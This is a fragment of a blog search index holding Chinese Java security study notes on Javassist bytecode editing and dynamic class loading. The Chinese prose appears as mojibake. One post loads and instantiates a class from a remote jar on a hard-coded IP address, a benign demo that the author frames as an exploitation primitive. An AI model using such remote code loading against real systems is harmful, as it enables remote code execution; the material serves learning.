ï¼š\nhttps://javasec.org/javase/JavaDeserialization/Serialization.html\nhttps://blog.csdn.net/mocas_wang/article/details/107621010\n","date":"2024-07-03T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Javaååºåˆ—åŒ–"},{"content":"Java Javassist æ¦‚è¿° Java programming ASSISTantï¼ŒJavaç¼–ç¨‹åŠ©æ‰‹ã€‚æ˜¯Javaä¸­ç¼–è¾‘å­—èŠ‚ç çš„ç±»åº“ã€‚å®ƒå¯ä»¥åœ¨Javaç¨‹åºè¿è¡Œæ—¶å®šä¹‰ä¸€ä¸ªæ–°çš„ç±»ï¼Œå¹¶åŠ è½½åˆ°JVMä¸­ï¼›è¿˜å¯ä»¥åœ¨JVMåŠ è½½æ—¶ä¿®æ”¹ä¸€ä¸ªç±»æ–‡ä»¶ã€‚\nJavaä¸­æ‰€æœ‰çš„ç±»éƒ½è¢«ç¼–è¯‘ä¸ºclassæ–‡ä»¶æ¥è¿è¡Œï¼Œåœ¨ç¼–è¯‘å®Œclassæ–‡ä»¶ä¹‹åï¼Œç±»ä¸èƒ½å†è¢«æ˜¾å¼ä¿®æ”¹ï¼Œè€ŒJavassistå°±æ˜¯ç”¨æ¥å¤„ç†ç¼–è¯‘åçš„classæ–‡ä»¶ï¼Œå®ƒå¯ä»¥ç”¨æ¥ä¿®æ”¹æ–¹æ³•æˆ–è€…æ–°å¢æ–¹æ³•ï¼Œå¹¶ä¸”ä¸éœ€è¦æ·±å…¥äº†è§£å­—èŠ‚ç ï¼Œè¿˜å¯ä»¥ç”Ÿæˆä¸€ä¸ªæ–°çš„ç±»å¯¹è±¡ã€‚\nJavassistæ ¸å¿ƒAPI ClassPool è¿™ä¸ªç±»æ˜¯javassistçš„æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ã€‚ClassPoolæ˜¯CtClasså¯¹è±¡å®¹å™¨ï¼Œ\nå¸¸ç”¨æ–¹æ³•ï¼š\nClassPool getDefault()ï¼šè¿”å›é»˜è®¤çš„ClassPoolï¼Œä¸€èˆ¬é€šè¿‡è¯¥æ–¹æ³•åˆ›å»ºæˆ‘ä»¬çš„ClassPoolï¼› ClassPool insertClassPath(ClassPath cp)ï¼šå°†ä¸€ä¸ªClassPathå¯¹è±¡æ’å…¥åˆ°ç±»æœç´¢è·¯å¾„çš„èµ·å§‹ä½ç½®ï¼Œä¹Ÿå°±æ˜¯å‘ClassPoolå®¹å™¨æ’å…¥ä¸€ä¸ª.classå¯¹è±¡ã€‚ ClassPool appendClassPathï¼šå°†ä¸€ä¸ªClassPathå¯¹è±¡åŠ åˆ°ç±»æœç´¢è·¯å¾„çš„æœ«å°¾ä½ç½®ï¼› CtClass makeClass(java.lang.String classname)ï¼šæ ¹æ®ç±»ååˆ›å»ºæ–°çš„CtClasså¯¹è±¡ã€‚ç±»åå¿…é¡»æ˜¯å…¨é‡ç±»åã€‚ CtClass get(java.lang.String classname)ï¼šä»æºä¸­è¯»å–ç±»æ–‡ä»¶ï¼Œå¹¶è¿”å›å¯¹CtClassæ¥è¡¨ç¤ºå¯¹è¯¥ç±»æ–‡ä»¶çš„å¯¹è±¡çš„å¼•ç”¨ã€‚ CtClass åœ¨javassistä¸­æ¯ä¸ªéœ€è¦ç¼–è¯‘çš„classéƒ½å¯¹åº”ä¸€ä¸ªCtClasså®ä¾‹ï¼ŒCtClassï¼ˆcompile time classï¼‰ï¼Œè¿™äº›ç±»ä¼šå­˜å‚¨åœ¨ClassPoolä¸­ã€‚æ‰€ä»¥CtClasså¯¹è±¡å¿…é¡»ä»è¯¥å¯¹è±¡å®¹å™¨ä¸­è·å–ã€‚\nå¸¸ç”¨æ–¹æ³•ï¼š\nvoid setSuperclass(CtClass clazz)ï¼šæ›´æ”¹è¶…ç±»ï¼ˆçˆ¶ç±»ï¼‰ï¼Œé™¤éæ­¤å¯¹è±¡è¡¨ç¤ºæ¥å£ã€‚ byte[] toBytecode()ï¼šå°†è¯¥ç±»è½¬æ¢ä¸ºç±»æ–‡ä»¶ï¼Œå³å°†CtClasså¯¹è±¡ccè½¬æ¢ä¸ºå­—èŠ‚ç æ•°ç»„ï¼› CtConstructor makeClassInitializer()ï¼šåˆ¶ä½œä¸€ä¸ªç©ºçš„ç±»åˆå§‹åŒ–ç¨‹åºï¼ˆé™æ€æ„é€ å‡½æ•°ï¼‰ã€‚ Class x.toClass()ï¼šå°†Ctclassç±»å‹çš„å­—èŠ‚ç è½¬æ¢æˆClassç±»å‹ã€‚ CtMethod/CtField å…¶å®è¿™ä¸‰ä¸ªå¯ä»¥ç†è§£ä¸ºåŠ å¼ºç‰ˆClass/method/fieldå¯¹è±¡ã€‚åŒæ ·å¯ä»¥ä½¿ç”¨CtClassä¸­çš„CtFieldå’ŒCtMethodæ¥è·å–ç±»å¯¹è±¡ä¸­çš„å­—æ®µå’Œæ–¹æ³•ã€‚\nMaven åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­ï¼Œæƒ³è¦ä½¿ç”¨å°±éœ€è¦åŠ ä¾èµ–ï¼Œ\nåœ¨POM.XMLä¸­æ·»åŠ å¦‚ä¸‹ä»£ç å³å¯ï¼ˆæ³¨æ„ä¾èµ–çš„ç‰ˆæœ¬ï¼‰ï¼š\n1 2 3 4 5 6 7 //è¿™æ ·æ‰èƒ½ä½¿ç”¨javassist \u0026lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.28.0-GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; è¯»å–ç±»/æˆå‘˜å˜é‡/æ–¹æ³•ä¿¡æ¯çš„ä»£ç  ä½¿ç”¨ClassPoolå¯¹è±¡è·å–åˆ°CtClasså¯¹è±¡åå°±å¯ä»¥åƒä½¿ç”¨Javaåå°„APIä¸€æ ·å»è¯»å–ç±»ä¿¡æ¯äº†ã€‚æœ€ç»ˆåœ¨mavené¡¹ç›®ä¸­çš„æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; public class Test{ private String name; protected char yn; public int age; public void setAge(int age){ this.age = age; } protected int getAge(){ return this.age; } public Test(String name,char yn,int age){ this.age = age; this.yn = yn; this.name = name; } private String getName(){ return this.name; } } è·å–çš„æ“ä½œï¼š\nMain.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example; import javassist.ClassPool; import javassist.CtClass; import javassist.CtField; import javassist.CtMethod; import javassist.CtConstructor; public class Main{ public static void main(String[] args) throws Exception{ //è·å–ClassPoolå¯¹è±¡ ClassPool classPool = ClassPool.getDefault(); System.out.println(\u0026#34;1:\u0026#34;+classPool); //è·å–CtClasså¯¹è±¡ CtClass ctClass = classPool.getCtClass(\u0026#34;org.example.Test\u0026#34;);//è¿™é‡Œget()ç­‰åŒäºgetClass() System.out.println(\u0026#34;2:\u0026#34;+ctClass); //è·å–CtFieldå±æ€§ CtField[] ctField = ctClass.getDeclaredFields(); for(CtField x : ctField){ System.out.println(\u0026#34;3:\u0026#34;+x); } //è·å–CtMethodæ–¹æ³• CtMethod[] ctMethod = ctClass.getDeclaredMethods(); for(CtMethod x : ctMethod){ System.out.println(\u0026#34;4:\u0026#34;+x); } //è·å–CtConStructoræ„é€ æ–¹æ³• CtClass[] parameters = new CtClass[]{ classPool.get(\u0026#34;java.lang.String\u0026#34;), CtClass.charType, CtClass.intType }; CtConstructor ctConstructor = ctClass.getDeclaredConstructor(parameters); System.out.println(\u0026#34;5:\u0026#34;+ctConstructor); } } è¾“å‡ºä¸ºï¼š\n1 2 3 4 5 6 7 8 9 1:[class path: java.lang.Object.class;] 2:javassist.CtClassType@5caf905d[public class org.example.Test fields=org.example.Test.name:Ljava/lang/String;, org.example.Test.yn:C, org.example.Test.age:I, constructors=javassist.CtConstructor@3d494fbf[public Test (Ljava/lang/String;CI)V], methods=javassist.CtMethod@3ac68cb[public setAge (I)V], javassist.CtMethod@7424e08a[protected getAge ()I], javassist.CtMethod@26562bc2[private getName ()Ljava/lang/String;], ] 3:org.example.Test.name:Ljava/lang/String; 3:org.example.Test.yn:C 3:org.example.Test.age:I 4:javassist.CtMethod@3ac68cb[public setAge (I)V] 4:javassist.CtMethod@7424e08a[protected getAge ()I] 4:javassist.CtMethod@26562bc2[private getName ()Ljava/lang/String;] 5:javassist.CtConstructor@3d494fbf[public Test (Ljava/lang/String;CI)V] æ³¨æ„çœ‹è¯»å–ä»£ç è¿™é‡Œçš„ç»†èŠ‚ã€‚ä¸åå°„å¯¹æ¯”ï¼Œå°¤å…¶æ˜¯å¯¹äºå‡½æ•°å‚æ•°ç±»å‹çš„æ”¹å˜ã€‚\nä¿®æ”¹ç±»æ–¹æ³• åªéœ€è¦è°ƒç”¨CtMethodç±»çš„å¯¹åº”çš„APIï¼ŒCtMethodæä¾›äº†ç±»æ–¹æ³•ä¿®æ”¹çš„APIï¼Œå¦‚ï¼š\nsetModifiersï¼šå¯ä¿®æ”¹ç±»çš„è®¿é—®ä¿®é¥°ç¬¦ï¼Œ\ninsertBeforeå’ŒinsertAfterï¼šèƒ½å¤Ÿå®ç°åœ¨ç±»æ–¹æ³•æ‰§è¡Œçš„å‰åæ’å…¥ä»»æ„çš„Javaä»£ç ç‰‡æ®µï¼Œ\nsetBody ï¼šå¯ä»¥ä¿®æ”¹æ•´ä¸ªæ–¹æ³•çš„ä»£ç ç­‰ã€‚\nsetNameï¼šä¿®æ”¹æ–¹æ³•å\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; public class Test{ private String name; protected char yn; public int age; public void setAge(int age){ this.age = age; } protected int getAge(){ return this.age; } public Test(String name,char yn,int age){ this.age = age; this.yn = yn; this.name = name; } private String getName(){ return this.name; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example; import javassist.ClassPool; import javassist.CtMethod; import javassist.CtClass; public class Main{ public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.getCtClass(\u0026#34;org.example.Test\u0026#34;); //ä¿®æ”¹æ•´ä¸ªä»£ç å— CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;getAge\u0026#34;); ctMethod.setBody(\u0026#34;{return \\\u0026#34;haha\\\u0026#34; ;}\u0026#34;); //ä¿®æ”¹éƒ¨åˆ†ï¼Œçœ‹ä»£ç ç»“æ„ CtMethod ctMethod1 = ctClass.getDeclaredMethod(\u0026#34;setAge\u0026#34;,new CtClass[]{CtClass.intType}); ctMethod1.insertBefore(\u0026#34;System.out.println(\\\u0026#34;before is\\\u0026#34;);\u0026#34;); CtMethod ctMethod2 = ctClass.getDeclaredMethod(\u0026#34;getName\u0026#34;); ctMethod2.insertAfter(\u0026#34;System.out.println(\\\u0026#34;after is\\\u0026#34;);\u0026#34;); //è¾“å‡ºä¿®æ”¹åçš„å­—èŠ‚ç åˆ°æ–‡ä»¶ï¼Œæ–¹ä¾¿çœ‹ç»“æœ ctClass.writeFile(\u0026#34;output\u0026#34;);//è½åœ°çš„æ˜¯classæ–‡ä»¶ } } ç°åœ¨æ¥çœ‹çœ‹ä¿®æ”¹åæ—¶ä»€ä¹ˆï¼Œç»“æœå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 //Test.class package org.example; public class Test { private String name; protected char yn; public int age; public void setAge(int age) { System.out.println(\u0026#34;before is\u0026#34;); this.age = age; } protected int getAge() { return (int)\u0026#34;haha\u0026#34;; } public Test(String name, char yn, int age) { this.age = age; this.yn = yn; this.name = name; } private String getName() { String var2 = this.name; System.out.println(\u0026#34;after is\u0026#34;); return var2; } } å¯ä»¥å¯¹æ¯”ä¸€ä¸‹ä¹‹å‰çš„Test.javaçœ‹çœ‹ç»“æœã€‚\nåŠ¨æ€åˆ›å»ºä¸€ä¸ªç±» APIæä¾›ç›¸åº”çš„makeæ–¹æ³•å®ç°çš„æ“ä½œ\nçœ‹ä¸‹é¢çš„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package org.example; import javassist.ClassPool; import javassist.CtClass; import javassist.CtField; import javassist.CtMethod; public class Main { public static void main(String[] args) { try { // åˆ›å»ºClassPoolå¯¹è±¡ ClassPool classPool = ClassPool.getDefault(); // ä½¿ç”¨ClassPoolåˆ›å»ºä¸€ä¸ªæ–°çš„ç±» CtClass ctClass = classPool.makeClass(\u0026#34;org.example.haha\u0026#34;); // åˆ›å»ºç±»æˆå‘˜å˜é‡content CtField ctField = CtField.make(\u0026#34;private static String content = \\\u0026#34;Hello world~\\\u0026#34;;\u0026#34;, ctClass); // å°†æˆå‘˜å˜é‡æ·»åŠ åˆ°ctClasså¯¹è±¡ä¸­ ctClass.addField(ctField); // åˆ›å»ºä¸€ä¸ªä¸»æ–¹æ³•å¹¶è¾“å‡ºcontentå¯¹è±¡å€¼ CtMethod ctMethod = CtMethod.make( \u0026#34;public static void main(String[] args) { System.out.println(content); }\u0026#34;, ctClass ); // å°†æˆå‘˜æ–¹æ³•æ·»åŠ åˆ°ctClasså¯¹è±¡ä¸­ ctClass.addMethod(ctMethod); //æ ¹æ®åŒ…ç»“æ„åˆ›å»ºç›®å½•å¹¶ç”Ÿæˆæ–‡ä»¶ ctClass.writeFile(\u0026#34;output\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } } å¾ˆæ¸…æ¥šï¼Œç†è§£å­¦ä¹ ä¸€ä¸‹ä»£ç å°±è¡Œäº†ï¼Œå»ºè®®åœ¨å­¦ä¹ åè‡ªå·±æ•²ä¸€éã€‚\néšåå°±ç”Ÿæˆäº†haha.class\nå†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package org.example; public class haha { private static String content = \u0026#34;Hello world~\u0026#34;; public static void main(String[] var0) { System.out.println(content); } public haha() { } } ä¸€èˆ¬å…·ä½“ä½¿ç”¨çš„æ—¶å€™ä¼šåˆ©ç”¨åˆ°staticè¯­å¥å—ï¼Œç®€å•æ„é€ ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import javassist.*; public class Main { public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026#34;haha\u0026#34;); CtField ctField = CtField.make(\u0026#34;private String content = \\\u0026#34;111\\\u0026#34;;\u0026#34;, ctClass); ctClass.addField(ctField); CtMethod ctMethod = CtMethod.make(\u0026#34;public String getContent(){ return this.content;}\u0026#34;, ctClass); ctClass.addMethod(ctMethod); CtConstructor ctConstructor = ctClass.makeClassInitializer(); ctConstructor.insertBefore(\u0026#34;System.out.println(\\\u0026#34;123\\\u0026#34;);\u0026#34;); ctClass.writeFile(\u0026#34;output\u0026#34;); Class clazz = ctClass.toClass(); clazz.getDeclaredConstructor().newInstance(); } } æˆåŠŸåœ¨å…¬èŒå¤ªè¾“å‡º 123ã€‚\nç”Ÿæˆçš„haha.classæ–‡ä»¶å†…å®¹ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // public class haha { private String content = \u0026#34;111\u0026#34;; public String getContent() { return this.content; } static { System.out.println(\u0026#34;123\u0026#34;); } public haha() { } } å…¶å®è¿˜æœ‰å…¶ä»–çš„APIå¯ä»¥ç”¨æ¥æ„é€ ä¸€ä¸ªç±»ä»¥åŠç±»ä¸­çš„å„ç§å±æ€§ï¼Œä½†è¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚\nä¹Ÿå¯ä»¥åˆ©ç”¨äºŒè¿›åˆ¶æ¥åŠ¨æ€åˆ›å»ºï¼Œå¦‚ä¸‹ï¼š\nä½†æ˜¯è¿™ä¸ªéœ€è¦åœ¨é¡¹ç›®ä¸­æ·»åŠ ä¾èµ–\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-io\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-io\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.8.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; ç„¶åå†è¿è¡Œä¸‹é¢è¿™ä¸ªä»£ç å³å¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package org.example; import javassist.ClassPool; import javassist.CtClass; import javassist.CtField; import javassist.CtMethod; import org.apache.commons.io.FileUtils; import java.io.File; import java.util.Arrays; public class Main { public static void main(String[] args) { try { // åˆ›å»ºClassPoolå¯¹è±¡ ClassPool classPool = ClassPool.getDefault(); // ä½¿ç”¨ClassPoolåˆ›å»ºä¸€ä¸ªæ–°çš„ç±» CtClass ctClass = classPool.makeClass(\u0026#34;org.example.haha\u0026#34;); // åˆ›å»ºç±»æˆå‘˜å˜é‡content CtField ctField = CtField.make(\u0026#34;private static String content = \\\u0026#34;Hello world~\\\u0026#34;;\u0026#34;, ctClass); // å°†æˆå‘˜å˜é‡æ·»åŠ åˆ°ctClasså¯¹è±¡ä¸­ ctClass.addField(ctField); // åˆ›å»ºä¸€ä¸ªä¸»æ–¹æ³•å¹¶è¾“å‡ºcontentå¯¹è±¡å€¼ CtMethod ctMethod = CtMethod.make( \u0026#34;public static void main(String[] args) { System.out.println(content); }\u0026#34;, ctClass ); // å°†æˆå‘˜æ–¹æ³•æ·»åŠ åˆ°ctClasså¯¹è±¡ä¸­ ctClass.addMethod(ctMethod); // ä½¿ç”¨ç±»CtClassï¼Œç”Ÿæˆç±»äºŒè¿›åˆ¶ byte[] bytes = ctClass.toBytecode(); // è¾“å‡ºäºŒè¿›åˆ¶æ•°æ®åˆ°æ§åˆ¶å° System.out.println(Arrays.toString(bytes)); // å°†classäºŒè¿›åˆ¶å†…å®¹å†™å…¥åˆ°ç±»æ–‡ä»¶ File classFilePath = new File(new File(System.getProperty(\u0026#34;user.dir\u0026#34;), \u0026#34;maven_text/output/org/example\u0026#34;), \u0026#34;haha.class\u0026#34;); FileUtils.writeByteArrayToFile(classFilePath, bytes); // å°†ç”Ÿæˆçš„ç±»å†™å…¥æ–‡ä»¶ç³»ç»Ÿ ctClass.writeFile(\u0026#34;output\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } } çœ‹ä¸€çœ‹ä»£ç ç†è§£ä¸€ä¸‹ã€‚\nç„¶åç”Ÿæˆå¦‚ä¸‹ç›®å½•ç»“æ„ï¼š\nhaha.classçš„å†…å®¹åŒä¸Šã€‚\næœ‰ä¸ªç‚¹ç¨å¾®è¯´æ˜ä¸€ä¸‹ï¼Œä½¿ç”¨å¦‚ä¸‹ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import javassist.*; public class Main { public static void main(String[] args) throws Exception{ ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026#34;org.example.erqi\u0026#34;); CtField ctField = CtField.make(\u0026#34;public String name = \\\u0026#34;ahhaha\\\u0026#34;; \u0026#34;,ctClass); ctClass.addField(ctField); CtMethod ctMethod = CtMethod.make(\u0026#34;public void setName(String name){ this.name = name ;}\u0026#34;,ctClass); ctClass.addMethod(ctMethod); Class clazz = ctClass.toClass(); System.out.println(ctClass); System.out.println(clazz); } } è¾“å‡ºä¸ºï¼š\n1 2 3 javassist.CtNewClass@67f89fa3[hasConstructor changed frozen public class org.example.erqi fields=org.example.erqi.name:Ljava/lang/String;, constructors=javassist.CtConstructor@4ac68d3e[public erqi ()V], methods=javassist.CtMethod@ab2416c4[public setName (Ljava/lang/String;)V], ] class org.example.erqi ç»†å¿ƒçš„å¸ˆå‚…å¯èƒ½éƒ½å·²ç»å‘ç°äº†ï¼Œå¯¹äºå‰é¢æ‰€æœ‰çš„ç”¨è¿‡çš„ä»£ç ï¼Œæˆ‘ä»¬çš„æ“ä½œå±‚é¢éƒ½æ˜¯å­—èŠ‚ç ï¼Œæ‰€ä»¥ç”Ÿæˆçš„æ–‡ä»¶éƒ½æ˜¯classæ–‡ä»¶ï¼Œå¯ä»¥ç†è§£ä¸€ä¸‹è¿™ä¸ªè¾“å‡ºç»“æœã€‚\næœ€åï¼Œæ—¢ç„¶æˆ‘ä»¬éƒ½å·²ç»ç”Ÿæˆäº†.classæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å°±å¯ä»¥åˆ©ç”¨å¾ˆå¤šæ–¹æ³•äº†ï¼Œæ¯”å¦‚åŠ¨æ€åŠ è½½å­—èŠ‚ç ã€‚æ³¨æ„æ€è€ƒã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://cloud.tencent.com/developer/article/1815164\nhttps://blog.csdn.net/google20/article/details/144730353\nhttps://nivi4.notion.site/Java-Javassist-621beee2064a4494abe794843028449d\n","date":"2024-06-23T22:54:06+08:00","permalink":"https://fupanc-w1n.github.io/p/javassist/","title":"Javassist"},{"content":"åŠ¨æ€åŠ è½½å­—èŠ‚ç  å­—èŠ‚ç  Javaå­—èŠ‚ç æŒ‡çš„æ˜¯JVMæ‰§è¡Œä½¿ç”¨çš„ä¸€ç±»æŒ‡ä»¤ï¼Œé€šå¸¸è¢«å­˜å‚¨åœ¨.classæ–‡ä»¶ä¸­ã€‚\nåŠ è½½è¿œç¨‹/æœ¬åœ°æ–‡ä»¶ åœ¨å‰é¢ç±»åŠ è½½æœºåˆ¶çš„å­¦ä¹ ä¸­ï¼Œæ­£å¸¸æƒ…å†µä¸‹URLClassLoaderæ˜¯AppClassLoaderçš„çˆ¶ç±»ã€‚\né€šå¸¸æƒ…å†µä¸‹,Javaä¼šæ ¹æ®é…ç½®é¡¹sun.boot.class.pathå’Œjava.class.pathä¸­åˆ—ä¸¾çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„java.net.URLç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ï¼Œè¿™ä¸ªåŸºç¡€è·¯å¾„åˆåˆ†ä¸‰ç§æƒ…å†µï¼š\nURLæœªä»¥æ–œæ /ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJaræ–‡ä»¶ï¼Œä½¿ç”¨JarLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³åœ¨JaråŒ…ä¸Šå¯»æ‰¾ç±»ã€‚ URLä»¥/ç»“å°¾ï¼Œä¸”åè®®åä¸ºfileï¼Œåˆ™ä½¿ç”¨FileLoaderæ¥å¯»æ‰¾ç±»ï¼Œå³åœ¨æœ¬åœ°ç³»ç»Ÿä¸­å¯»æ‰¾.classæ–‡ä»¶ URLä»¥æ–œæ /ç»“å°¾ï¼Œä¸”åè®®åä¸ä¸ºfileï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„Loaderæ¥å¯»æ‰¾ç±» æœ¬åœ°åŠ è½½ .class æ–‡ä»¶\nå…¶å®éƒ½æ˜¯å‰é¢è¯´è¿‡çš„äº†ï¼Œä¸»è¦æ˜¯åŠ è½½classæ–‡ä»¶ï¼Œæ‰€ä»¥classæ–‡ä»¶ä¸èƒ½æœ‰åŒ…åã€‚\nReflection.javaå†…å®¹ï¼š\n1 2 3 4 5 6 7 public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; public Reflection(){ System.out.println(\u0026#34;è°ƒç”¨äº†Reflectionçš„æ„é€ å‡½æ•°\u0026#34;); } } Main.javaå†…å®¹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;file://D:\\\\\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;Reflection\u0026#34;); clazz.newInstance(); } } å¯ä»¥å…ˆä½¿ç”¨javacå°†Reflection.javaæ‰“æˆReflection.classç„¶åæ”¾åœ¨Dç›˜ã€‚\næˆ‘çš„mavené¡¹ç›®æ˜¯è‡ªåŠ¨ç¼–è¯‘ç„¶åæ”¾åœ¨é¡¹ç›®ä¸­çš„targetç›®å½•ä¸‹çš„ï¼Œè¿™é‡Œç›´æ¥æ‰¾å°±è¡Œã€‚\nå¯åŠ¨æˆåŠŸè¾“å‡ºï¼š\n1 è°ƒç”¨äº†Reflectionçš„æ„é€ å‡½æ•° ä½†æ˜¯æˆ‘å‘ç°å¯ä»¥å¦‚ä¸‹åŠ è½½ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 //è¿™ä¸ªReflectionç±»æ˜¯æœ‰åŒ…åçš„ package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;file://D:\\\\\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;java_foundation.Reflection\u0026#34;); clazz.newInstance(); } } ä»¥æ­¤ç±»æ¨å§ï¼Œå¯¹äºclassæ–‡ä»¶ä¹Ÿä¸ä¸€å®šæ˜¯å¿…é¡»æ²¡æœ‰åŒ…åï¼ŒåŠ è½½æ—¶åŠ ä¸Šè½¯ä»¶åŒ…å³å¯ï¼Œåé¢å°±ä¸è¡¥å……äº†ã€‚\nè¿œç¨‹åŠ è½½ .class æ–‡ä»¶\nå…¶å®éƒ½æ˜¯å·®ä¸å¤šçš„ï¼Œè¿™é‡Œè¯•ä¸€ä¸‹è¿œç¨‹åŠ è½½è‡ªå·±vpsä¸Šçš„classæ–‡ä»¶ï¼Œä½†æ„Ÿè§‰åº”è¯¥ä¸è¡Œï¼Œåº”è¯¥æ˜¯æœ‰ä»€ä¹ˆå®‰å…¨ç­–ç•¥çš„ã€‚è‡ªå·±å°è¯•ç¼–å†™ä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;http://47.100.223.173/Reflection.class\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;Reflection\u0026#34;); clazz.newInstance(); } } ç„¶åå°†æœ¬åœ°çš„Reflection.javaæ–‡ä»¶åˆ é™¤ï¼Œå†æ¥è¿è¡Œï¼Œå‘ç°æŠ¥é”™å¦‚ä¸‹:\n1 2 3 4 5 Exception in thread \u0026#34;main\u0026#34; java.lang.ClassNotFoundException: Reflection at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at java_foundation.Main.main(Main.java:9) å¯èƒ½æ˜¯URLè·¯å¾„é—®é¢˜ï¼Œè¿™æ˜¯æˆ‘çœ‹äº†ä¸€ä¸‹å‰é¢è®²çš„åŸºç¡€è·¯å¾„ï¼Œå°è¯•ä¸€ä¸‹ç”¨jaråŒ…å‘¢ï¼Œæ‰€ä»¥æˆ‘å°†æ„å»ºjaråŒ…çš„ä»£ç æ”¹æˆå¦‚ä¸‹ï¼š\n1 2 3 4 5 public class MyTest{ public MyTest(){ System.out.println(\u0026#34;è°ƒç”¨äº†è¿œç¨‹urlç±»çš„æ„é€ å‡½æ•°\u0026#34;); } } ç„¶åä¼ åˆ°æœåŠ¡å™¨ä¸Šå³å¯ï¼Œå¦‚ä¸‹å°è¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;http://47.100.223.173/jar_build.jar\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); clazz.newInstance(); } } æˆåŠŸè°ƒç”¨å¹¶è¾“å‡ºï¼š\n1 è°ƒç”¨äº†è¿œç¨‹urlç±»çš„æ„é€ å‡½æ•° è¿™æ ·ç”¨ç¬¦åˆåŸºç¡€è·¯å¾„çš„æ ¼å¼æˆåŠŸè°ƒç”¨äº†è¿œç¨‹çš„classä»£ç ã€‚æ„Ÿè§‰åˆ©ç”¨ç‚¹å¾ˆå¤§å‘¢ã€‚\nåˆ©ç”¨defineClass()ç›´æ¥åŠ è½½å­—èŠ‚ç  åœ¨ä¹‹å‰çš„è°ƒè¯•ä¸­ï¼Œå¯ä»¥çŸ¥é“JavaåŠ è½½éƒ½éœ€è¦ç»è¿‡ï¼š\n1 ClassLoader.loadClass -\u0026gt; ClassLoader.findClass -\u0026gt; ClassLoader.defineClass å…¶ä¸­ï¼š\nloadClassçš„ä½œç”¨æ˜¯ä»å·²ç»åŠ 